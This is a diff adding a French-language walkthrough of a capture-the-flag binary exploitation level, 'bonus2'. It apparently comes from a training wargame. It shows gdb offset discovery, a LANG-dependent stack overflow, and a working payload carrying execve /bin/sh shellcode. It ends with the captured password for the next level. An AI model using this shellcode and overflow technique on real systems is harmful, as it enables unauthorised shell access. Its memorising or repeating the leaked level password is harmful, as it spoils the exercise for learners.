@@ -1,0 +1,48 @@
+Note: Installer peda si cela n'est pas deja fait.
+
+gdb ./bonus2
+
+info function:
+-----> Le binaire contient les fonctions main et greetuser.
+
+source /tmp/peda/peda.py
+set disassembly-flavor intel
+
+r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+rewrite patiel de l'EIP :
+0x08004141
+
+export LANG="fi"
+
+r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+0x41414141
+
+run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+-> 0x41366141
+offset: 18.
+
+Objectif:
+Placer le shellcode en av1
+placer l'adresse du shellcode en av2 a l'offset 18.
+
+Get the address of the first argument:
+adresse de av1:
+
+b *greetuset+147
+r `python -c "print 'A' * 40 + ' ' + 'A' * 18 + 'ADDR'"`
+x/x $esp+4 
+-> 0xbffff640
+
+Exploit:
+
+`python -c "print '\x44\xf6\xff\xbf' + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A' * 15 + ' ' + 'A' * 18 + '\x40\xf6\xff\xbf'"`
+
+
+./bonus2 `python -c "print '\x44\xf6\xff\xbf' + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A' * 15 + ' ' + 'A' * 18 + '\x40\xf6\xff\xbf'"`
+
+cat /home/user/bonus3/.pass
+
+--> 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
